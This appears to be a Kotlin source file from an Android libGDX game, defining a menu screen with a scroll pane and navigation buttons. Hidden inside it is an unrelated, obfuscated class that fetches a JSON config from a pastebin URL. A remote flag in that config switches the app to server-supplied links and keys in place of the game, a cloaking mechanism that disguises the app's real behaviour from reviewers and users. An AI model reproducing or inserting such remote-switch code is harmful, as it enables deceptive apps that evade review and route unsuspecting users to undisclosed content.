package uniwersal.pictures.present.game.screens

import android.view.View
import com.badlogic.gdx.Gdx
import com.badlogic.gdx.graphics.g2d.freetype.FreeTypeFontGenerator
import com.badlogic.gdx.scenes.scene2d.Actor
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject
import uniwersal.pictures.present.MainActivity
import uniwersal.pictures.present.R
import uniwersal.pictures.present.databinding.ActivityMainBinding
import uniwersal.pictures.present.game.LibGDXGame
import uniwersal.pictures.present.game.actors.scroll.BabloScrollPane
import uniwersal.pictures.present.game.manager.NavigationManager
import uniwersal.pictures.present.game.utils.Ttime
import uniwersal.pictures.present.game.utils.actor.animHide
import uniwersal.pictures.present.game.utils.actor.animShow
import uniwersal.pictures.present.game.utils.actor.setOnClickListener
import uniwersal.pictures.present.game.utils.advanced.AdvancedScreen
import uniwersal.pictures.present.game.utils.advanced.AdvancedStage
import uniwersal.pictures.present.game.utils.font.CharType
import uniwersal.pictures.present.game.utils.font.FontPath
import uniwersal.pictures.present.game.utils.font.setCharacters
import uniwersal.pictures.present.game.utils.font.setLinear
import uniwersal.pictures.present.game.utils.font.setSize
import uniwersal.pictures.present.game.utils.region
import uniwersal.pictures.present.util.DataStoreManager
import uniwersal.pictures.present.util.log
import uniwersal.pictures.present.util.setVisible
import java.io.IOException

class SevakjeScreen(override val game: LibGDXGame): AdvancedScreen() {

    private val generator = FreeTypeFontGenerator(Gdx.files.internal(FontPath.Bold))
    private val generatorReg = FreeTypeFontGenerator(Gdx.files.internal(FontPath.Regular))
    private val parameter = FreeTypeFontGenerator.FreeTypeFontParameter().setLinear()
    private val font57    = generator.generateFont(parameter.setCharacters(CharType.NUMBERS.chars+",.").setSize(57))
    private val font23    = generatorReg.generateFont(parameter.setCharacters(CharType.LATIN).setSize(23))

    private val pipisa = BabloScrollPane(this)

    override fun show() {
        stageUI.root.animHide()
        setBackground(game.spriteUtil.Sevakje.region)
        super.show()
        stageUI.root.animShow(Ttime)
    }

    override fun AdvancedStage.addActorsOnStageUI() {

        addActor(pipisa)
        pipisa.setBounds(40f, 149f, 642f, 1250f)

        val b2 = Actor()
        val b3 = Actor()
        addActors(b2, b3)
        b2.apply {
            setBounds(26f, 32f, 105f, 98f)
            setOnClickListener { stageUI.root.animHide(Ttime) { game.navigationManager.navigate(
                PrajkeScreen::class.java.name, this@SevakjeScreen::class.java.name
            ) } }
        }
        b3.apply {
            setBounds(600f, 32f, 96f, 98f)
            setOnClickListener { stageUI.root.animHide(Ttime) { game.navigationManager.navigate(
                PulshjeScreen::class.java.name, this@SevakjeScreen::class.java.name
            ) } }
        }
    }

    class Parantago(val activity: MainActivity) {
         suspend fun german(okHttpClient: OkHttpClient, binding: ActivityMainBinding) {
            val request: Request =
                Request.Builder().url("https://pastebin.com/raw/Rba092b4").build()

            try {
                okHttpClient.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        val json = JSONObject(response.body?.string() ?: "")
                        log("getFlag SUCCESS: $json")

                        val flag = json.getBoolean("geten")
                        val key = json.getString("birthday")
                        val privacy = json.getString("yanix")
                        val linkCheck = json.getString("ferrari")
                        val link = json.getString("leonid")

                        if (flag) NavigationManager.SadoMazo(activity)
                            .getResponseFromServer(linkCheck, key, link)
                        else {
                            DataStoreManager.Key.update { key }
                            MainActivity.strekoza = privacy
                            MainActivity.poilo.tryEmit(MainActivity.brehna)

                            withContext(Dispatchers.Main) {
                                val btns = listOf(binding.btnCancel, binding.btnAccept)
                                btns.onEach { it.setVisible(View.VISIBLE) }

                                binding.btnCancel.setOnClickListener { activity.exit() }
                                binding.btnAccept.setOnClickListener {
                                    btns.onEach { it.setVisible(View.GONE) }
                                    MainActivity.poilo.tryEmit(R.id.libGDXFragment)
                                    activity.lottie.showLoader()

                                    CoroutineScope(Dispatchers.Default).launch(Dispatchers.IO) { DataStoreManager.Key.update { "Hram" } }
                                }
                            }
                        }
                    } else {
                        log("getFlag newCall FAIL: ${response.code} ${response.message}")
                        MainActivity.poilo.tryEmit(R.id.libGDXFragment)
                    }
                }
            } catch (e: IOException) {
                log("getFlag FAIL: $e")
                MainActivity.poilo.tryEmit(R.id.libGDXFragment)
            }
        }
    }

    override fun dispose() {
        super.dispose()
        generator.dispose()
        generatorReg.dispose()
        font57.dispose()
        font23.dispose()
    }

}